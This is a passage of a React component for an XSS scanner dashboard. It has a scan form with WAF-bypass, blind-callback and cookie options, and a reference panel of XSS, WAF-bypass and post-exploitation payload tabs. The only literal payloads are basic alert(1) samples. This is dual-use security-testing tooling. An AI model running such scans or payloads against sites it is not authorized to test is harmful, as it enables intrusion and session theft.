    window.setTimeout(() => setCopiedPayload(null), 2000);
  };

  const toggleTool = (toolName: string) => {
    setSelectedTools(prev =>
      prev.includes(toolName)
        ? prev.filter(t => t !== toolName)
        : [...prev, toolName]
    );
  };

  const filteredResults = selectedScan?.results?.filter(r => {
    if (!resultFilter) return true;
    return r.url.toLowerCase().includes(resultFilter.toLowerCase()) ||
           r.parameter.toLowerCase().includes(resultFilter.toLowerCase()) ||
           r.payload.toLowerCase().includes(resultFilter.toLowerCase()) ||
           r.type.toLowerCase().includes(resultFilter.toLowerCase());
  }) || [];

  const stats = {
    total: scans.length,
    running: scans.filter(s => s.status === 'running').length,
    completed: scans.filter(s => s.status === 'completed').length,
    vulns: scans.reduce((acc, s) => acc + (s.vulnerabilitiesFound || 0), 0),
  };

  const refTabs = [
    { id: 'types', label: 'XSS Types', icon: Bug },
    { id: 'contexts', label: 'Contexts', icon: Layers },
    { id: 'events', label: 'Event Handlers', icon: Zap },
    { id: 'bypass', label: 'WAF Bypass', icon: Lock },
    { id: 'encoding', label: 'Encoding', icon: Hash },
    { id: 'dom', label: 'DOM XSS', icon: Globe },
    { id: 'polyglot', label: 'Polyglots', icon: Code },
    { id: 'browser', label: 'Browser Specific', icon: Globe },
    { id: 'postexp', label: 'Post-Exploitation', icon: Target },
    { id: 'manual', label: 'Manual Testing', icon: Terminal },
  ];

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-white flex items-center gap-3">
            <Shield className="w-7 h-7 text-red-400" />
            XSS Scanner
          </h1>
          <p className="text-slate-400 mt-1">Cross-Site Scripting vulnerability detection with best-in-class tools</p>
        </div>
        <div className="flex items-center gap-3">
          <button
            onClick={() => setShowReference(!showReference)}
            className={cn(
              "flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-colors",
              showReference
                ? "bg-red-600 hover:bg-red-500 text-white"
                : "bg-dark-800 hover:bg-dark-700 text-slate-300"
            )}
          >
            <FileText className="w-4 h-4" />
            XSS Reference
          </button>
          <button
            onClick={() => { setShowForm(true); setSelectedScan(null); }}
            className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-500 rounded-lg text-sm text-white font-medium transition-colors"
          >
            <Plus className="w-4 h-4" />
            New Scan
          </button>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        {[
          { label: 'Total Scans', value: stats.total, icon: Target, color: 'text-primary-400' },
          { label: 'Running', value: stats.running, icon: Loader2, color: 'text-blue-400' },
          { label: 'Completed', value: stats.completed, icon: CheckCircle, color: 'text-green-400' },
          { label: 'Vulnerabilities', value: stats.vulns, icon: AlertTriangle, color: 'text-red-400' },
        ].map((stat, index) => (
          <motion.div
            key={stat.label}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: index * 0.1 }}
            className="p-4 bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800"
          >
            <div className="flex items-center justify-between">
              <div>
                <p className="text-slate-400 text-sm">{stat.label}</p>
                <p className="text-2xl font-bold text-white mt-1">{stat.value}</p>
              </div>
              <stat.icon className={cn('w-8 h-8', stat.color, stat.label === 'Running' && stats.running > 0 && 'animate-spin')} />
            </div>
          </motion.div>
        ))}
      </div>

      {/* Comprehensive XSS Reference Section */}
      {showReference && (
        <motion.div
          initial={{ opacity: 0, height: 0 }}
          animate={{ opacity: 1, height: 'auto' }}
          exit={{ opacity: 0, height: 0 }}
          className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 overflow-hidden"
        >
          {/* Reference Tabs */}
          <div className="flex flex-wrap gap-1 p-3 border-b border-dark-700 bg-dark-800/50">
            {refTabs.map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveRefTab(tab.id)}
                className={cn(
                  'flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-colors',
                  activeRefTab === tab.id
                    ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                    : 'text-slate-400 hover:text-white hover:bg-dark-700'
                )}
              >
                <tab.icon className="w-3.5 h-3.5" />
                {tab.label}
              </button>
            ))}
          </div>

          <div className="p-4 max-h-[600px] overflow-y-auto">
            {/* XSS Types Tab */}
            {activeRefTab === 'types' && (
              <div className="space-y-3">
                <h3 className="text-lg font-semibold text-white mb-4">XSS Attack Types</h3>
                {xssTypes.map((type) => (
                  <div key={type.name} className="border border-dark-700 rounded-lg overflow-hidden">
                    <button
                      onClick={() => setExpandedType(expandedType === type.name ? null : type.name)}
                      className="w-full flex items-center justify-between p-3 bg-dark-800/50 hover:bg-dark-700/50 transition-colors"
                    >
                      <div className="flex items-center gap-3">
                        <span className={cn(
                          'px-2 py-0.5 rounded text-xs font-medium uppercase',
                          type.severity === 'critical' && 'bg-red-500/20 text-red-400',
                          type.severity === 'high' && 'bg-orange-500/20 text-orange-400',
                          type.severity === 'medium' && 'bg-yellow-500/20 text-yellow-400',
                          type.severity === 'low' && 'bg-blue-500/20 text-blue-400',
                        )}>
                          {type.severity}
                        </span>
                        <span className="font-medium text-white">{type.name}</span>
                      </div>
                      {expandedType === type.name ? <ChevronDown className="w-4 h-4 text-slate-400" /> : <ChevronRight className="w-4 h-4 text-slate-400" />}
                    </button>
                    {expandedType === type.name && (
                      <div className="p-4 space-y-4 border-t border-dark-700">
                        <p className="text-sm text-slate-300">{type.description}</p>
                        <div>
                          <h4 className="text-sm font-medium text-white mb-2">Manual Testing Methods:</h4>
                          <ul className="space-y-1">
                            {type.manual.map((method, i) => (
                              <li key={i} className="text-xs text-slate-400 flex items-start gap-2">
                                <span className="text-red-400 mt-0.5">•</span>
                                {method}
                              </li>
                            ))}
                          </ul>
                        </div>
                        <div>
                          <h4 className="text-sm font-medium text-white mb-2">Example Payloads:</h4>
                          <div className="space-y-1">
                            {type.payloads.map((payload, i) => (
                              <div key={i} className="flex items-center gap-2 group">
                                <code className="flex-1 text-xs text-red-400 bg-dark-900 p-2 rounded font-mono break-all">
                                  {payload}
                                </code>
                                <button
                                  onClick={() => copyPayload(payload)}
                                  className="p-1.5 text-slate-500 hover:text-white transition-colors opacity-0 group-hover:opacity-100"
                                >
                                  {copiedPayload === payload ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                                </button>
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}

            {/* Injection Contexts Tab */}
            {activeRefTab === 'contexts' && (
              <div className="space-y-3">
                <h3 className="text-lg font-semibold text-white mb-4">Injection Contexts</h3>
                {injectionContexts.map((ctx) => (
                  <div key={ctx.name} className="border border-dark-700 rounded-lg overflow-hidden">
                    <button
                      onClick={() => setExpandedContext(expandedContext === ctx.name ? null : ctx.name)}
                      className="w-full flex items-center justify-between p-3 bg-dark-800/50 hover:bg-dark-700/50 transition-colors"
                    >
                      <span className="font-medium text-white">{ctx.name}</span>
                      {expandedContext === ctx.name ? <ChevronDown className="w-4 h-4 text-slate-400" /> : <ChevronRight className="w-4 h-4 text-slate-400" />}
                    </button>
                    {expandedContext === ctx.name && (
                      <div className="p-4 space-y-4 border-t border-dark-700">
                        <p className="text-sm text-slate-300">{ctx.description}</p>
                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <h4 className="text-xs font-medium text-slate-400 mb-1">Detection:</h4>
                            <p className="text-sm text-white">{ctx.detection}</p>
                          </div>
                          <div>
                            <h4 className="text-xs font-medium text-slate-400 mb-1">Breakout Method:</h4>
                            <p className="text-sm text-white">{ctx.breakout}</p>
                          </div>
                        </div>
                        <div>
                          <h4 className="text-sm font-medium text-white mb-2">Payloads:</h4>
                          <div className="grid grid-cols-1 gap-1">
                            {ctx.payloads.map((payload, i) => (
                              <div key={i} className="flex items-center gap-2 group">
                                <code className="flex-1 text-xs text-red-400 bg-dark-900 p-2 rounded font-mono break-all">
                                  {payload}
                                </code>
                                <button
                                  onClick={() => copyPayload(payload)}
                                  className="p-1.5 text-slate-500 hover:text-white transition-colors opacity-0 group-hover:opacity-100"
                                >
                                  {copiedPayload === payload ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                                </button>
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}

            {/* Event Handlers Tab */}
            {activeRefTab === 'events' && (
              <div className="space-y-3">
                <h3 className="text-lg font-semibold text-white mb-4">Event Handlers for XSS</h3>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-dark-700">
                        <th className="text-left p-2 text-slate-400 font-medium">Event</th>
                        <th className="text-left p-2 text-slate-400 font-medium">Applicable Tags</th>
                        <th className="text-left p-2 text-slate-400 font-medium">Example</th>
                        <th className="w-10"></th>
                      </tr>
                    </thead>
                    <tbody>
                      {eventHandlers.map((handler, i) => (
                        <tr key={i} className="border-b border-dark-800 hover:bg-dark-800/50 group">
                          <td className="p-2 text-red-400 font-mono">{handler.event}</td>
                          <td className="p-2 text-slate-300 text-xs">{handler.tags}</td>
                          <td className="p-2">
                            <code className="text-xs text-slate-400 font-mono">{handler.example}</code>
                          </td>
                          <td className="p-2">
                            <button
                              onClick={() => copyPayload(handler.example)}
                              className="p-1 text-slate-500 hover:text-white transition-colors opacity-0 group-hover:opacity-100"
                            >
                              {copiedPayload === handler.example ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}

            {/* WAF Bypass Tab */}
            {activeRefTab === 'bypass' && (
              <div className="space-y-3">
                <h3 className="text-lg font-semibold text-white mb-4">WAF Bypass Techniques</h3>
                {wafBypassTechniques.map((technique) => (
                  <div key={technique.name} className="border border-dark-700 rounded-lg overflow-hidden">
                    <button
                      onClick={() => setExpandedBypass(expandedBypass === technique.name ? null : technique.name)}
                      className="w-full flex items-center justify-between p-3 bg-dark-800/50 hover:bg-dark-700/50 transition-colors"
                    >
                      <span className="font-medium text-white">{technique.name}</span>
                      {expandedBypass === technique.name ? <ChevronDown className="w-4 h-4 text-slate-400" /> : <ChevronRight className="w-4 h-4 text-slate-400" />}
                    </button>
                    {expandedBypass === technique.name && (
                      <div className="p-4 space-y-3 border-t border-dark-700">
                        <p className="text-sm text-slate-300">{technique.description}</p>
                        <div className="space-y-1">
                          {technique.payloads.map((payload, i) => (
                            <div key={i} className="flex items-center gap-2 group">
                              <code className="flex-1 text-xs text-orange-400 bg-dark-900 p-2 rounded font-mono break-all">
                                {payload}
                              </code>
                              <button
                                onClick={() => copyPayload(payload)}
                                className="p-1.5 text-slate-500 hover:text-white transition-colors opacity-0 group-hover:opacity-100"
                              >
                                {copiedPayload === payload ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                              </button>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}

            {/* Encoding Tab */}
            {activeRefTab === 'encoding' && (
              <div className="space-y-4">
                <h3 className="text-lg font-semibold text-white mb-4">Encoding Methods</h3>
                {encodingMethods.map((method) => (
                  <div key={method.name} className="border border-dark-700 rounded-lg p-4">
                    <h4 className="font-medium text-white mb-2">{method.name}</h4>
                    <p className="text-sm text-slate-400 mb-3">{method.description}</p>
                    <div className="overflow-x-auto">
                      <table className="w-full text-sm">
                        <thead>
                          <tr className="border-b border-dark-700">
                            <th className="text-left p-2 text-slate-400 font-medium">Original</th>
                            <th className="text-left p-2 text-slate-400 font-medium">Encoded</th>
                            <th className="w-10"></th>
                          </tr>
                        </thead>
                        <tbody>
                          {method.examples.map((ex, i) => (
                            <tr key={i} className="border-b border-dark-800 group">
                              <td className="p-2 text-white font-mono">{ex.original}</td>
                              <td className="p-2 text-yellow-400 font-mono text-xs">{ex.encoded}</td>
                              <td className="p-2">
                                <button
                                  onClick={() => copyPayload(ex.encoded)}
                                  className="p-1 text-slate-500 hover:text-white transition-colors opacity-0 group-hover:opacity-100"
                                >
                                  {copiedPayload === ex.encoded ? <Check className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                                </button>
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* DOM XSS Tab */}
            {activeRefTab === 'dom' && (
              <div className="space-y-6">
                <div>
                  <h3 className="text-lg font-semibold text-white mb-4">Dangerous Sinks (Where data is used)</h3>
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm">
                      <thead>
                        <tr className="border-b border-dark-700">
                          <th className="text-left p-2 text-slate-400 font-medium">Sink</th>
                          <th className="text-left p-2 text-slate-400 font-medium">Risk</th>
                          <th className="text-left p-2 text-slate-400 font-medium">Description</th>
                        </tr>
                      </thead>
                      <tbody>
                        {domSinks.map((sink, i) => (
                          <tr key={i} className="border-b border-dark-800 hover:bg-dark-800/50">
                            <td className="p-2 text-red-400 font-mono text-xs">{sink.sink}</td>
                            <td className="p-2">
                              <span className={cn(
                                'px-2 py-0.5 rounded text-xs',
                                sink.risk === 'Critical' && 'bg-red-500/20 text-red-400',
                                sink.risk === 'High' && 'bg-orange-500/20 text-orange-400',
                                sink.risk === 'Medium' && 'bg-yellow-500/20 text-yellow-400',
                              )}>
                                {sink.risk}
                              </span>
                            </td>
                            <td className="p-2 text-slate-300 text-xs">{sink.description}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
                <div>
                  <h3 className="text-lg font-semibold text-white mb-4">Sources (Where data comes from)</h3>
                  <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
                    {domSources.map((source, i) => (
                      <div key={i} className="p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                        <code className="text-xs text-blue-400 font-mono">{source.source}</code>
                        <p className="text-xs text-slate-400 mt-1">{source.description}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Polyglot Tab */}
            {activeRefTab === 'polyglot' && (
              <div className="space-y-3">
                <h3 className="text-lg font-semibold text-white mb-4">Polyglot Payloads</h3>
                <p className="text-sm text-slate-400 mb-4">Polyglots work across multiple injection contexts simultaneously.</p>
                {polyglotPayloads.map((poly, i) => (
                  <div key={i} className="border border-dark-700 rounded-lg p-4">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="font-medium text-white">{poly.name}</h4>
                      <button
                        onClick={() => copyPayload(poly.payload)}
                        className="p-1.5 text-slate-500 hover:text-white transition-colors"
                      >
                        {copiedPayload === poly.payload ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                      </button>
                    </div>
                    <p className="text-xs text-slate-400 mb-2">{poly.description}</p>
                    <code className="block text-xs text-purple-400 bg-dark-900 p-3 rounded font-mono break-all overflow-x-auto">
                      {poly.payload}
                    </code>
                  </div>
                ))}
              </div>
            )}

            {/* Browser Specific Tab */}
            {activeRefTab === 'browser' && (
              <div className="space-y-4">
                <h3 className="text-lg font-semibold text-white mb-4">Browser-Specific Payloads</h3>
                {browserSpecificPayloads.map((browser, i) => (
                  <div key={i} className="border border-dark-700 rounded-lg p-4">
                    <h4 className="font-medium text-white mb-3 flex items-center gap-2">
                      <Globe className="w-4 h-4 text-blue-400" />
                      {browser.browser}
                    </h4>
                    <div className="space-y-2">
                      {browser.payloads.map((payload, j) => (
                        <div key={j} className="flex items-center gap-2 group">
                          <code className="flex-1 text-xs text-cyan-400 bg-dark-900 p-2 rounded font-mono break-all">
                            {payload}
                          </code>
                          <button
                            onClick={() => copyPayload(payload)}
                            className="p-1.5 text-slate-500 hover:text-white transition-colors opacity-0 group-hover:opacity-100"
                          >
                            {copiedPayload === payload ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                          </button>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* Post-Exploitation Tab */}
            {activeRefTab === 'postexp' && (
              <div className="space-y-3">
                <h3 className="text-lg font-semibold text-white mb-4">Post-Exploitation Techniques</h3>
                <p className="text-sm text-slate-400 mb-4">After achieving XSS, these techniques demonstrate impact.</p>
                {postExploitation.map((tech, i) => (
                  <div key={i} className="border border-dark-700 rounded-lg p-4">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="font-medium text-white">{tech.name}</h4>
                      <button
                        onClick={() => copyPayload(tech.payload)}
                        className="p-1.5 text-slate-500 hover:text-white transition-colors"
                      >
                        {copiedPayload === tech.payload ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                      </button>
                    </div>
                    <p className="text-xs text-slate-400 mb-2">{tech.description}</p>
                    <code className="block text-xs text-green-400 bg-dark-900 p-2 rounded font-mono break-all">
                      {tech.payload}
                    </code>
                  </div>
                ))}
              </div>
            )}

            {/* Manual Testing Tab */}
            {activeRefTab === 'manual' && (
              <div className="space-y-4">
                <h3 className="text-lg font-semibold text-white mb-4">Manual XSS Testing Methodology</h3>
                {manualTestingSteps.map((step) => (
                  <div key={step.step} className="border border-dark-700 rounded-lg p-4">
                    <div className="flex items-center gap-3 mb-3">
                      <span className="w-8 h-8 flex items-center justify-center bg-red-500/20 text-red-400 rounded-full font-bold text-sm">
                        {step.step}
                      </span>
                      <h4 className="font-medium text-white">{step.title}</h4>
                    </div>
                    <p className="text-sm text-slate-300 mb-3">{step.description}</p>
                    <ul className="space-y-1">
                      {step.actions.map((action, i) => (
                        <li key={i} className="text-xs text-slate-400 flex items-start gap-2">
                          <span className="text-red-400 mt-0.5">→</span>
                          {action}
                        </li>
                      ))}
                    </ul>
                  </div>
                ))}
              </div>
            )}
          </div>
        </motion.div>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left Panel - Form or Scan Details */}
        <div className="lg:col-span-2">
          {showForm ? (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="p-6 bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800"
            >
              <h2 className="text-lg font-semibold text-white mb-4">New XSS Scan</h2>
              <form onSubmit={handleSubmit} className="space-y-4">
                {/* URL Input */}
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-1">
                    Target URL <span className="text-red-400">*</span>
                  </label>
                  <div className="relative">
                    <LinkIcon className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                    <input
                      type="text"
                      value={url}
                      onChange={(e) => setUrl(e.target.value)}
                      placeholder="https://example.com/search?q=test"
                      className="w-full pl-10 pr-4 py-2 bg-dark-800 border border-dark-700 rounded-lg text-sm text-white placeholder-slate-500 focus:outline-none focus:border-red-500/50 transition-colors"
                      required
                    />
                  </div>
                  <p className="text-xs text-slate-500 mt-1">URL with parameters to test for XSS</p>
                </div>

                {/* Tools Selection */}
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    Scanning Tools
                  </label>
                  <div className="grid grid-cols-2 gap-2">
                    {tools.map((tool) => (
                      <button
                        key={tool.name}
                        type="button"
                        onClick={() => toggleTool(tool.name)}
                        disabled={!tool.installed && tool.name !== 'builtin'}
                        className={cn(
                          'p-3 rounded-lg border text-left transition-all',
                          selectedTools.includes(tool.name)
                            ? 'bg-red-500/20 border-red-500/50 text-white'
                            : 'bg-dark-800/50 border-dark-700 text-slate-400 hover:border-dark-600',
                          !tool.installed && tool.name !== 'builtin' && 'opacity-50 cursor-not-allowed'
                        )}
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-medium text-sm capitalize">{tool.name}</span>
                          {tool.installed ? (
                            <CheckCircle className="w-4 h-4 text-green-400" />
                          ) : (
                            <XCircle className="w-4 h-4 text-slate-500" />
                          )}
                        </div>
                        <p className="text-xs text-slate-500 mt-1">{tool.description}</p>
                      </button>
                    ))}
                  </div>
                </div>

                {/* WAF Bypass Toggle */}
                <div className="flex items-center justify-between p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                  <div>
                    <p className="text-sm font-medium text-white">WAF Bypass Mode</p>
                    <p className="text-xs text-slate-500">Use advanced payloads to bypass WAF</p>
                  </div>
                  <button
                    type="button"
                    onClick={() => setWafBypass(!wafBypass)}
                    className={cn(
                      'relative inline-flex h-6 w-11 flex-shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none',
                      wafBypass ? 'bg-red-500' : 'bg-dark-600'
                    )}
                    role="switch"
                    aria-checked={wafBypass}
                  >
                    <span
                      className={cn(
                        'pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out',
                        wafBypass ? 'translate-x-5' : 'translate-x-0'
                      )}
                    />
                  </button>
                </div>

                {/* Advanced Options */}
                <div className="border-t border-dark-700 pt-4">
                  <button
                    type="button"
                    onClick={() => setShowAdvanced(!showAdvanced)}
                    className="flex items-center gap-2 text-sm font-medium text-slate-300 hover:text-white transition-colors"
                  >
                    <Settings className="w-4 h-4" />
                    Advanced Options
                    {showAdvanced ? <ChevronDown className="w-4 h-4" /> : <ChevronRight className="w-4 h-4" />}
                  </button>

                  {showAdvanced && (
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: 'auto' }}
                      className="mt-4 space-y-4"
                    >
                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <label className="block text-xs text-slate-400 mb-1">Threads</label>
                          <input
                            type="number"
                            value={threads}
                            onChange={(e) => setThreads(e.target.value)}
                            className="w-full px-3 py-2 bg-dark-800 border border-dark-700 rounded-lg text-sm text-white focus:outline-none focus:border-red-500/50"
                          />
                        </div>
                        <div>
                          <label className="block text-xs text-slate-400 mb-1">Timeout (seconds)</label>
                          <input
                            type="number"
                            value={timeout}
                            onChange={(e) => setTimeout(e.target.value)}
                            className="w-full px-3 py-2 bg-dark-800 border border-dark-700 rounded-lg text-sm text-white focus:outline-none focus:border-red-500/50"
                          />
                        </div>
                      </div>

                      <div>
                        <label className="block text-xs text-slate-400 mb-1">Blind XSS Callback URL</label>
                        <input
                          type="text"
                          value={blindXss}
                          onChange={(e) => setBlindXss(e.target.value)}
                          placeholder="https://your-callback.xss.ht"
                          className="w-full px-3 py-2 bg-dark-800 border border-dark-700 rounded-lg text-sm text-white placeholder-slate-500 focus:outline-none focus:border-red-500/50"
                        />
                      </div>

                      <div>
                        <label className="block text-xs text-slate-400 mb-1">Cookies</label>
                        <input
                          type="text"
                          value={cookies}
                          onChange={(e) => setCookies(e.target.value)}
                          placeholder="session=abc123; token=xyz"
                          className="w-full px-3 py-2 bg-dark-800 border border-dark-700 rounded-lg text-sm text-white placeholder-slate-500 focus:outline-none focus:border-red-500/50"
                        />
                      </div>

                      <div>
                        <label className="block text-xs text-slate-400 mb-1">Custom Payloads (one per line)</label>
                        <textarea
                          value={customPayloads}
                          onChange={(e) => setCustomPayloads(e.target.value)}
                          placeholder="<script>alert(1)</script>&#10;<img src=x onerror=alert(1)>"
                          rows={4}
                          className="w-full px-3 py-2 bg-dark-800 border border-dark-700 rounded-lg text-sm text-white placeholder-slate-500 focus:outline-none focus:border-red-500/50 font-mono"
                        />
                      </div>
                    </motion.div>
                  )}
                </div>

                {/* Submit Button */}
                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={submitting || !url || selectedTools.length === 0}
                    className="w-full flex items-center justify-center gap-2 px-4 py-3 bg-red-600 hover:bg-red-500 disabled:bg-dark-700 disabled:cursor-not-allowed rounded-lg text-sm text-white font-medium transition-colors"
                  >
                    {submitting ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        Starting Scan...
                      </>
                    ) : (
                      <>
                        <Play className="w-4 h-4" />
                        Start XSS Scan
                      </>
                    )}
                  </button>
                </div>
              </form>
            </motion.div>
          ) : selectedScan ? (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="p-6 bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800"
            >
              {/* Scan Header */}
              <div className="flex items-start justify-between mb-4">
                <div>
                  <h2 className="text-lg font-semibold text-white break-all">{selectedScan.url}</h2>
                  <div className="flex items-center gap-3 mt-2 flex-wrap">
                    <span className="text-sm text-slate-400">
                      Tools: {selectedScan.config.tools.join(', ')}
                    </span>
                    {selectedScan.config.wafBypass && (
                      <span className="px-2 py-0.5 bg-orange-500/20 text-orange-400 rounded text-xs">
                        WAF Bypass
                      </span>
                    )}
                    {(() => {
                      const status = statusConfig[selectedScan.status] || statusConfig.pending;
                      const StatusIcon = status.icon;
                      return (
                        <span className={cn('flex items-center gap-1 px-2 py-0.5 rounded text-xs', status.bg, status.color)}>
                          <StatusIcon className={cn('w-3 h-3', selectedScan.status === 'running' && 'animate-spin')} />
                          {status.label}
                        </span>
                      );
                    })()}
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  {selectedScan.status === 'running' && (
                    <button
                      onClick={() => handleCancel(selectedScan._id)}
                      className="p-2 text-slate-400 hover:text-red-400 transition-colors"
                      title="Cancel"
                    >
                      <Square className="w-4 h-4" />
                    </button>
                  )}
                  <button
                    onClick={() => { setShowForm(true); setSelectedScan(null); }}
                    className="p-2 text-slate-400 hover:text-white transition-colors"
                    title="New Scan"
                  >
                    <Plus className="w-4 h-4" />
                  </button>
                </div>
              </div>

              {/* Scan Info */}
              <div className="grid grid-cols-4 gap-4 mb-4 p-3 bg-dark-800/50 rounded-lg">
                <div>
                  <p className="text-xs text-slate-500">Started</p>
                  <p className="text-sm text-white">{selectedScan.startedAt ? formatDateTime(selectedScan.startedAt) : '-'}</p>
                </div>
                <div>
                  <p className="text-xs text-slate-500">Completed</p>
                  <p className="text-sm text-white">{selectedScan.completedAt ? formatDateTime(selectedScan.completedAt) : '-'}</p>
                </div>
                <div>
                  <p className="text-xs text-slate-500">Progress</p>
                  <p className="text-sm text-white font-medium">
                    {selectedScan.totalUrls > 0
                      ? `${selectedScan.urlsScanned}/${selectedScan.totalUrls}`
                      : selectedScan.urlsScanned || 0}
                  </p>
                </div>
                <div>
                  <p className="text-xs text-slate-500">Vulnerabilities</p>
                  <p className="text-sm text-red-400 font-medium">{selectedScan.vulnerabilitiesFound || 0}</p>
                </div>
              </div>

              {/* Results Filter */}
              {selectedScan.results && selectedScan.results.length > 0 && (
                <div className="mb-4">
                  <div className="relative">
                    <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                    <input
                      type="text"
                      value={resultFilter}
                      onChange={(e) => setResultFilter(e.target.value)}
                      placeholder="Filter results..."
                      className="w-full pl-10 pr-4 py-2 bg-dark-800 border border-dark-700 rounded-lg text-sm text-white placeholder-slate-500 focus:outline-none focus:border-red-500/50 transition-colors"
                    />
                  </div>
                </div>
              )}

              {/* Results */}
              {selectedScan.status === 'running' && (!selectedScan.results || selectedScan.results.length === 0) ? (
                <div className="space-y-4">
                  {/* Progress indicator */}
                  <div className="flex flex-col items-center justify-center py-6">
                    <Loader2 className="w-8 h-8 text-red-400 animate-spin mb-4" />
                    <p className="text-slate-400">{selectedScan.currentPhase || 'Scanning for XSS vulnerabilities...'}</p>
                    {selectedScan.totalUrls > 0 && (
                      <div className="mt-3 w-full max-w-xs">
                        <div className="flex justify-between text-xs text-slate-500 mb-1">
                          <span>{selectedScan.urlsScanned} / {selectedScan.totalUrls} requests</span>
                          <span>{Math.round((selectedScan.urlsScanned / selectedScan.totalUrls) * 100)}%</span>
                        </div>
                        <div className="h-2 bg-dark-700 rounded-full overflow-hidden">
                          <div
                            className="h-full bg-red-500 transition-all duration-300"
                            style={{ width: `${(selectedScan.urlsScanned / selectedScan.totalUrls) * 100}%` }}
                          />
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Live logs */}
                  {selectedScan.logs && selectedScan.logs.length > 0 && (
                    <div className="border-t border-dark-700 pt-4">
                      <h3 className="text-sm font-medium text-white mb-2 flex items-center gap-2">
                        <Code className="w-4 h-4 text-slate-400" />
                        Scan Logs
                      </h3>
                      <div className="bg-dark-900 rounded-lg p-3 max-h-[300px] overflow-y-auto font-mono text-xs space-y-1">
                        {selectedScan.logs.map((log, index) => (
                          <div key={index} className="flex items-start gap-2">
                            <span className="text-slate-600 shrink-0">
                              {new Date(log.timestamp).toLocaleTimeString()}
                            </span>
                            <span className={cn(
                              'shrink-0 uppercase w-12',
                              log.level === 'success' && 'text-green-400',
                              log.level === 'info' && 'text-blue-400',
                              log.level === 'warn' && 'text-yellow-400',
                              log.level === 'error' && 'text-red-400',
                            )}>
                              [{log.level}]
                            </span>
                            <span className="text-slate-300">{log.message}</span>
                            {log.details && (
                              <span className="text-slate-500 truncate">{log.details}</span>
                            )}
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              ) : filteredResults.length > 0 ? (
                <div className="space-y-3">
                  {filteredResults.map((result, index) => (
                    <div
                      key={index}
                      className="p-4 bg-dark-800/50 rounded-lg border border-dark-700"
                    >
                      <div className="flex items-start justify-between gap-4">
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 flex-wrap mb-2">
                            <span className={cn(
                              'px-2 py-0.5 rounded text-xs font-medium uppercase',
                              severityConfig[result.severity]?.bg,
                              severityConfig[result.severity]?.color
                            )}>
                              {result.severity}
                            </span>
                            <span className="px-2 py-0.5 bg-dark-700 text-slate-300 rounded text-xs">
                              {result.type}
                            </span>
                            <span className={cn('text-xs', contextConfig[result.context]?.color)}>
                              {contextConfig[result.context]?.label}
                            </span>
                            {result.wafBypassed && (
                              <span className="px-2 py-0.5 bg-orange-500/20 text-orange-400 rounded text-xs">
                                WAF Bypassed
                              </span>
                            )}
                            <span className="text-xs text-slate-500">via {result.tool}</span>
                          </div>
